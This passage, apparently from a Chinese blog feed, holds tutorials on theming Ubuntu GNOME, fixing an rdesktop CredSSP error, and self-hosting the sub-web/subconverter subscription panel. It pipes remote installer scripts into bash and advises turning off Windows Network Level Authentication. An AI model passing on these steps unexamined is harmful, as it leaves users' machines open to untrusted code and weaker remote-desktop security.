removable-drive-menu（可移动驱动器菜单）</span><br><span class="line">20. screenshot-window-sizer（屏幕截图窗口大小调整器）</span><br><span class="line">21. tiling-assistant（平铺切换任务）</span><br><span class="line">22. Ubuntu AppIndicators（Ubuntu 应用指示器底栏应用框）</span><br><span class="line">23. Window List（将窗口列表添加到顶部面板）</span><br><span class="line">24. windowNavigator（允许在覆盖模式下使用键盘选择窗口和工作区）</span><br><span class="line">25. Workspace Indicator（工作区指示器）</span><br><span class="line">26. 关闭 ubuntu dock</span><br></pre></td></tr></table></figure><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000500843507-0961921.jpg" alt="点击放大图片"></p><h2 id="四：下载主题包等"><a href="#四：下载主题包等" class="headerlink" title="四：下载主题包等"></a>四：下载主题包等</h2><ul><li><strong>下载：</strong><a href="https://wwi.lanzoup.com/iOH3Q06v525a">https://wwi.lanzoup.com/iOH3Q06v525a</a></li></ul><h2 id="五：安装主题"><a href="#五：安装主题" class="headerlink" title="五：安装主题"></a>五：安装主题</h2><h3 id="（一）创建文件夹"><a href="#（一）创建文件夹" class="headerlink" title="（一）创建文件夹"></a>（一）创建文件夹</h3><p><strong>在用户根目录创建两个文件夹</strong></p><ol><li><strong>.themes</strong></li><li><strong>.icons</strong></li></ol><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000506257646.jpg" alt="点击放大图片"></p><h3 id="（二）安装图标"><a href="#（二）安装图标" class="headerlink" title="（二）安装图标"></a>（二）安装图标</h3><p><strong>1.将 McMojave-circle 移动到 .icons 文件下</strong></p><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000512548120.jpg" alt="点击放大图片"></p><p><strong>2.在优化中选择该图标</strong></p><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000508649845.jpg" alt="点击放大图片"></p><h3 id="（三）安装主题"><a href="#（三）安装主题" class="headerlink" title="（三）安装主题"></a>（三）安装主题</h3><p><strong>1.将 WhiteSur-Dark 移动到 .themes 文件夹下</strong></p><p><strong>2.将 WhiteSur-Dark-solid-nord 移动到 .themes 文件夹下</strong></p><p><strong>3.优化中 应用程序 选择 WhiteSur-Dark-solid-nord</strong></p><p><strong>4.优化中 shell 选择 WhiteSur-Dark-solid-nord</strong></p><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000515986777.jpg" alt="点击放大图片"></p><p><strong>5.在优化中选择该主题</strong></p><h2 id="六：全局菜单"><a href="#六：全局菜单" class="headerlink" title="六：全局菜单"></a>六：全局菜单</h2><h3 id="（一）下载"><a href="#（一）下载" class="headerlink" title="（一）下载"></a>（一）下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gonzaarcr/Fildem.git</span><br></pre></td></tr></table></figure><h3 id="（二）创建文件夹"><a href="#（二）创建文件夹" class="headerlink" title="（二）创建文件夹"></a>（二）创建文件夹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/.local/share/gnome-shell/extensions/</span><br></pre></td></tr></table></figure><h3 id="（三）打开下载的-Fildem-文件"><a href="#（三）打开下载的-Fildem-文件" class="headerlink" title="（三）打开下载的 Fildem 文件"></a>（三）打开下载的 Fildem 文件</h3><h3 id="（四）复制"><a href="#（四）复制" class="headerlink" title="（四）复制"></a>（四）复制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 fildemGMenu@gonza.com 复制到 /.local/share/gnome-shell/extensions/</span><br></pre></td></tr></table></figure><p>**1.命令：cp **<a href="mailto:fildemGMenu@gonza.com">fildemGMenu@gonza.com</a> -r ~&#x2F;.local&#x2F;share&#x2F;gnome-shell&#x2F;extensions&#x2F;</p><p><strong>2.直接复制也可以</strong><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000522995237.jpg" alt="点击放大图片"></p><h3 id="（五）去-GitHub-下载-releases"><a href="#（五）去-GitHub-下载-releases" class="headerlink" title="（五）去 GitHub 下载 releases"></a>（五）去 GitHub 下载 releases</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><ul><li><a href="https://github.com/gonzaarcr/Fildem">https://github.com/gonzaarcr/Fildem</a></li></ul><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000526850372.jpg" alt="点击放大图片"></p><h4 id="2-安装：sudo-dpkg-i-包名"><a href="#2-安装：sudo-dpkg-i-包名" class="headerlink" title="2.安装：sudo dpkg -i 包名"></a>2.安装：sudo dpkg -i 包名</h4><ul><li><strong>如果缺少依赖，先执行：apt install -f</strong></li></ul><h4 id="3-设置开机自启"><a href="#3-设置开机自启" class="headerlink" title="3.设置开机自启"></a>3.设置开机自启</h4><h5 id="（1）在-bin-文件下找到-fildem"><a href="#（1）在-bin-文件下找到-fildem" class="headerlink" title="（1）在 bin 文件下找到 fildem"></a>（1）在 bin 文件下找到 fildem</h5><ul><li><strong>命令：ls fildem</strong></li></ul><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000530779337.jpg" alt="点击放大图片"></p><h5 id="（2）打开启动应用程序"><a href="#（2）打开启动应用程序" class="headerlink" title="（2）打开启动应用程序"></a>（2）打开启动应用程序</h5><ul><li><strong>添加</strong></li></ul><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000535096647.jpg" alt="点击放大图片"></p><h5 id="（3）在拓展中启用-fildem-global-menu"><a href="#（3）在拓展中启用-fildem-global-menu" class="headerlink" title="（3）在拓展中启用 fildem global menu"></a>（3）在拓展中启用 fildem global menu</h5><ul><li><strong>如果找不到，重启即可！</strong></li></ul><h5 id="（4）然后打开-fildem-global-menu-设置，关闭第一个"><a href="#（4）然后打开-fildem-global-menu-设置，关闭第一个" class="headerlink" title="（4）然后打开 fildem global menu 设置，关闭第一个"></a>（4）然后打开 fildem global menu 设置，关闭第一个</h5><p><img src="/../images/ubuntu%E7%BE%8E%E5%8C%96/image-20240903000539453515.jpg" alt="点击放大图片"></p><h5 id="（5）然后注销或重启即可成功"><a href="#（5）然后注销或重启即可成功" class="headerlink" title="（5）然后注销或重启即可成功"></a>（5）然后注销或重启即可成功</h5><h5 id="（6）将-shell-修改为-whitesur-dark-即可顶栏"><a href="#（6）将-shell-修改为-whitesur-dark-即可顶栏" class="headerlink" title="（6）将 shell 修改为 whitesur-dark 即可顶栏"></a>（6）将 shell 修改为 whitesur-dark 即可顶栏</h5><h2 id="七：参考"><a href="#七：参考" class="headerlink" title="七：参考"></a>七：参考</h2><ol><li><strong>主题包：</strong><a href="https://www.gnome-look.org/p/1403328/">https://www.gnome-look.org/p/1403328/</a></li><li><strong>icnos 图标：</strong><a href="https://www.pling.com/p/1405756/">https://www.pling.com/p/1405756/</a></li><li><strong>鼠标图标：</strong><a href="https://www.pling.com/p/1355701/">https://www.pling.com/p/1355701/</a></li><li><strong>壁纸图标：</strong><a href="https://www.pling.com/p/1398833/">https://www.pling.com/p/1398833/</a></li><li><a href="https://zhuanlan.zhihu.com/p/176977192">https://zhuanlan.zhihu.com/p/176977192</a></li><li><strong>b 站</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 归纳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rdesktop连接Windows远程桌面因CredSSP报错解决办法</title>
      <link href="//archives/1725292972631/"/>
      <url>//archives/1725292972631/</url>
      
        <content type="html"><![CDATA[<h1 id="rdesktop连接Windows远程桌面因CredSSP报错解决办法"><a href="#rdesktop连接Windows远程桌面因CredSSP报错解决办法" class="headerlink" title="rdesktop连接Windows远程桌面因CredSSP报错解决办法"></a>rdesktop连接Windows远程桌面因CredSSP报错解决办法</h1><h2 id="一、问题"><a href="#一、问题" class="headerlink" title="一、问题"></a>一、问题</h2><ul><li><strong>今天在使用 kali 工具 rdesktop 连接 windows 远程桌面时，遇到以下报错问题</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.</span><br><span class="line">Failed to initialize NLA, do you have correct Kerberos TGT initialized ?</span><br><span class="line">Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).</span><br></pre></td></tr></table></figure><p><img src="/../images/rdesktop%E8%BF%9E%E6%8E%A5Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%9B%A0CredSSP%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20240902235335949346-0960248.png" alt="点击放大图片"></p><ul><li><strong>通过网上查找资料，发现只需关闭仅允许运行使用网络界别身份验证的远程桌面的计算机连接 (建议)</strong></li></ul><h2 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h2><p><strong>1、打开 windows 高级设置</strong></p><p><img src="/../images/rdesktop%E8%BF%9E%E6%8E%A5Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%9B%A0CredSSP%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20240902235337547619.png" alt="点击放大图片"></p><p><strong>2、选择远程</strong></p><p><img src="/../images/rdesktop%E8%BF%9E%E6%8E%A5Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%9B%A0CredSSP%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20240902235339665395.png" alt="点击放大图片"></p><p><strong>3、取消勾选 仅允许运行使用网络界别身份验证的远程桌面的计算机连接 (建议)</strong></p><p><img src="/../images/rdesktop%E8%BF%9E%E6%8E%A5Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%9B%A0CredSSP%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20240902235345603450.png" alt="点击放大图片"></p><p><strong>4、即可成功连接</strong></p><p><img src="/../images/rdesktop%E8%BF%9E%E6%8E%A5Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%9B%A0CredSSP%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20240902235416256493.png" alt="点击放大图片"></p><h2 id="三、替代"><a href="#三、替代" class="headerlink" title="三、替代"></a>三、替代</h2><p><strong>有些有时我们无法进入 windows 进行上述配置，这个时候就可以使用另一款工具</strong></p><h3 id="1-安装-remmina"><a href="#1-安装-remmina" class="headerlink" title="1.安装 remmina"></a>1.安装 remmina</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install remmina</span><br></pre></td></tr></table></figure><h3 id="2、创建连接"><a href="#2、创建连接" class="headerlink" title="2、创建连接"></a>2、创建连接</h3><p><img src="/../images/rdesktop%E8%BF%9E%E6%8E%A5Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%9B%A0CredSSP%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20240902235424945639.png" alt="点击放大图片"></p><h3 id="3、成功连接"><a href="#3、成功连接" class="headerlink" title="3、成功连接"></a>3、成功连接</h3><p><img src="/../images/rdesktop%E8%BF%9E%E6%8E%A5Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%9B%A0CredSSP%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20240902235420441924.png" alt="点击放大图片"></p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 归纳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sub-web订阅转换面板的搭建教程</title>
      <link href="//archives/1725292309858/"/>
      <url>//archives/1725292309858/</url>
      
        <content type="html"><![CDATA[<h1 id="sub-web订阅转换面板的搭建教程"><a href="#sub-web订阅转换面板的搭建教程" class="headerlink" title="sub-web订阅转换面板的搭建教程"></a>sub-web订阅转换面板的搭建教程</h1><h2 id="一、Sub-Web-前端搭建"><a href="#一、Sub-Web-前端搭建" class="headerlink" title="一、Sub-Web 前端搭建"></a>一、Sub-Web 前端搭建</h2><p><strong>项目地址：</strong><a href="https://github.com/CareyWang/sub-web">https://github.com/CareyWang/sub-web</a></p><h3 id="（一）安装-docker"><a href="#（一）安装-docker" class="headerlink" title="（一）安装 docker"></a>（一）安装 docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 官方一键安装脚本</span><br><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line"></span><br><span class="line">#国内 daocloud 一键安装命令</span><br><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure><h3 id="（二）下载源码"><a href="#（二）下载源码" class="headerlink" title="（二）下载源码"></a>（二）下载源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/CareyWang/sub-web.git</span><br></pre></td></tr></table></figure><h3 id="（三）搭建前端"><a href="#（三）搭建前端" class="headerlink" title="（三）搭建前端"></a>（三）搭建前端</h3><h4 id="1-打开文件"><a href="#1-打开文件" class="headerlink" title="1.打开文件"></a>1.打开文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd sub-we</span><br></pre></td></tr></table></figure><h4 id="2-运行-docker"><a href="#2-运行-docker" class="headerlink" title="2.运行 docker"></a>2.运行 docker</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 58080:80 --restart always --name subweb careywong/subweb:latest</span><br></pre></td></tr></table></figure><h3 id="（四）修改后端地址并增加远程规则"><a href="#（四）修改后端地址并增加远程规则" class="headerlink" title="（四）修改后端地址并增加远程规则"></a>（四）修改后端地址并增加远程规则</h3><p><strong>1.找到 VPS &#x2F;root&#x2F;sub-web&#x2F;src&#x2F;views&#x2F;Subconverter.vue 文件</strong></p><p><strong>2.找到 backendOptions 将你解析好的后端地址输入进去。域名为你刚才准备的后端域名，要将 http 改成 https，并且增加 &#x2F;sub? 的后缀。</strong></p><p>**3.找到 **<code>remoteConfig: [</code>   后  回车将下面的规则复制进去</p><p><img src="/../images/sub-web%E8%AE%A2%E9%98%85%E8%BD%AC%E6%8D%A2%E9%9D%A2%E6%9D%BF%E7%9A%84%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20240902235132295993-0959939.png" alt="点击放大图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    label: &quot;ACL4SSR&quot;,</span><br><span class="line">    options: [</span><br><span class="line">        &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online 默认版 分组比较全 (与Github同步)&quot;,</span><br><span class="line">            value: &quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online.ini&quot;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online_AdblockPlus 更多去广告 (与Github同步)&quot;,</span><br><span class="line">            value: &quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_AdblockPlus.ini&quot;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online_NoAuto 无自动测速 (与Github同步)&quot;,</span><br><span class="line">            value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_NoAuto.ini&quot;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online_NoReject 无广告拦截规则 (与Github同步)&quot;,</span><br><span class="line">            value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_NoReject.ini&quot;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online_Mini 精简版 (与Github同步)&quot;,</span><br><span class="line">            value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Mini.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online_Mini_AdblockPlus.ini 精简版 更多去广告 (与Github同步)&quot;,</span><br><span class="line">            value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Mini_AdblockPlus.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online_Mini_NoAuto.ini 精简版 不带自动测速 (与Github同步)&quot;,</span><br><span class="line">            value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Mini_NoAuto.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online_Mini_Fallback.ini 精简版 带故障转移 (与Github同步)&quot;,</span><br><span class="line">            value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Mini_Fallback.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">            label: &quot;ACL4SSR_Online_Mini_MultiMode.ini 精简版 自动测速、故障转移、负载均衡 (与Github同步)&quot;,</span><br><span class="line">            value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Mini_MultiMode.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_Online_Full 全分组 重度用户使用 (与Github同步)&quot;,</span><br><span class="line">          value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Full.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_Online_Full_NoAuto.ini 全分组 无自动测速 重度用户使用 (与Github同步)&quot;,</span><br><span class="line">          value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Full_NoAuto.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_Online_Full_AdblockPlus 全分组 重度用户使用 更多去广告 (与Github同步)&quot;,</span><br><span class="line">          value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Full_AdblockPlus.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_Online_Full_Netflix 全分组 重度用户使用 奈飞全量 (与Github同步)&quot;,</span><br><span class="line">          value:&quot;https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/config/ACL4SSR_Online_Full_Netflix.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR 本地 默认版 分组比较全&quot;,</span><br><span class="line">          value: &quot;config/ACL4SSR.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_Mini 本地 精简版&quot;,</span><br><span class="line">          value: &quot;config/ACL4SSR_Mini.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_Mini_NoAuto.ini 本地 精简版+无自动测速&quot;,</span><br><span class="line">          value: &quot;config/ACL4SSR_Mini_NoAuto.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_Mini_Fallback.ini 本地 精简版+fallback&quot;,</span><br><span class="line">          value: &quot;config/ACL4SSR_Mini_Fallback.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_BackCN 本地 回国&quot;,</span><br><span class="line">          value: &quot;config/ACL4SSR_BackCN.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">          label: &quot;ACL4SSR_NoApple 本地 无苹果分流&quot;,</span><br><span class="line">          value: &quot;config/ACL4SSR_NoApple.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">            label: &quot;ACL4SSR_NoAuto 本地 无自动测速 &quot;,</span><br><span class="line">            value: &quot;config/ACL4SSR_NoAuto.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">            label: &quot;ACL4SSR_NoAuto_NoApple 本地 无自动测速&amp;无苹果分流&quot;,</span><br><span class="line">            value: &quot;config/ACL4SSR_NoAuto_NoApple.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">            label: &quot;ACL4SSR_NoMicrosoft 本地 无微软分流&quot;,</span><br><span class="line">            value: &quot;config/ACL4SSR_NoMicrosoft.ini&quot;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">            label: &quot;ACL4SSR_WithGFW 本地 GFW列表&quot;,</span><br><span class="line">            value: &quot;config/ACL4SSR_WithGFW.ini&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h3 id="（五）配置完毕后打包网站"><a href="#（五）配置完毕后打包网站" class="headerlink" title="（五）配置完毕后打包网站"></a>（五）配置完毕后打包网站</h3><ul><li><strong>配置完毕以后，程序会自动更新，再次刷新前端网页，会出现刚才添加的相关规则，如图所示：</strong></li></ul><p><img src="/../images/sub-web%E8%AE%A2%E9%98%85%E8%BD%AC%E6%8D%A2%E9%9D%A2%E6%9D%BF%E7%9A%84%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20240902235128536640.png" alt="点击放大图片"></p><ul><li><strong>如图所示，经过上面的修改默认后端地址和原程配置的规则就修改好了。</strong></li><li><strong>至此，我们的前端调试完毕，我们现在需要打包，生成一个发布目录并将他发布了。</strong></li><li><strong>首先停止调试程序，CTRL+C ，退出当前调试，然后执行下面的命令进行打包：</strong></li><li><strong>参考链接：</strong><a href="https://www.mxlong.com/13.html">https://www.mxlong.com/13.html</a></li></ul><h2 id="二、SubConverter-后端搭建"><a href="#二、SubConverter-后端搭建" class="headerlink" title="二、SubConverter 后端搭建"></a>二、SubConverter 后端搭建</h2><h3 id="（一）下载并解压-subconverter-二进制文件"><a href="#（一）下载并解压-subconverter-二进制文件" class="headerlink" title="（一）下载并解压 subconverter 二进制文件"></a>（一）下载并解压 subconverter 二进制文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">wget https://github.com/tindy2013/subconverter/releases/download/v0.7.2/subconverter_linux64.tar.gz</span><br><span class="line">tar -zxvf subconverter_linux64.tar.gz</span><br></pre></td></tr></table></figure><ul><li><strong>完成以后，在 &#x2F;root 文件夹下会多出一个 subconverter 的文件夹，这个就是我们的后端程序</strong></li></ul><p><img src="/../images/sub-web%E8%AE%A2%E9%98%85%E8%BD%AC%E6%8D%A2%E9%9D%A2%E6%9D%BF%E7%9A%84%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20240902235125756298.png" alt="点击放大图片"></p><h3 id="（二）修改配置文件参数"><a href="#（二）修改配置文件参数" class="headerlink" title="（二）修改配置文件参数"></a>（二）修改配置文件参数</h3><ul><li><strong>找到 VPS 文件 &#x2F;root&#x2F;subconverter&#x2F;pref.ini ，找到如下参数进行修改</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">api_access_token=123123dfsdsdfsdfsdf            #随意设置自己知道就行</span><br><span class="line">managed_config_prefix=https://sub.yourdomin.com  #设置成我们刚刚解析的域名</span><br><span class="line">listen=127.0.0.1                                #这里改成 127.0.0.1 进行反代</span><br></pre></td></tr></table></figure><h3 id="（三）创建服务进程并启动"><a href="#（三）创建服务进程并启动" class="headerlink" title="（三）创建服务进程并启动"></a>（三）创建服务进程并启动</h3><ul><li><strong>接下来我们需要创建一个服务，让 VPS 每次重启或是开机自动运行后端程序</strong></li><li><strong>找到 VPS 目录 &#x2F;etc&#x2F;systemd&#x2F;system，创建一个名为 sub.service 的文件</strong></li><li><strong>打开文件，贴入以下内容，保存。</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=A API For Subscription Convert</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/root/subconverter/subconverter</span><br><span class="line">WorkingDirectory=/root/subconverter</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=10</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><h3 id="（四）检查运行状态以及设置开机自启"><a href="#（四）检查运行状态以及设置开机自启" class="headerlink" title="（四）检查运行状态以及设置开机自启"></a>（四）检查运行状态以及设置开机自启</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl 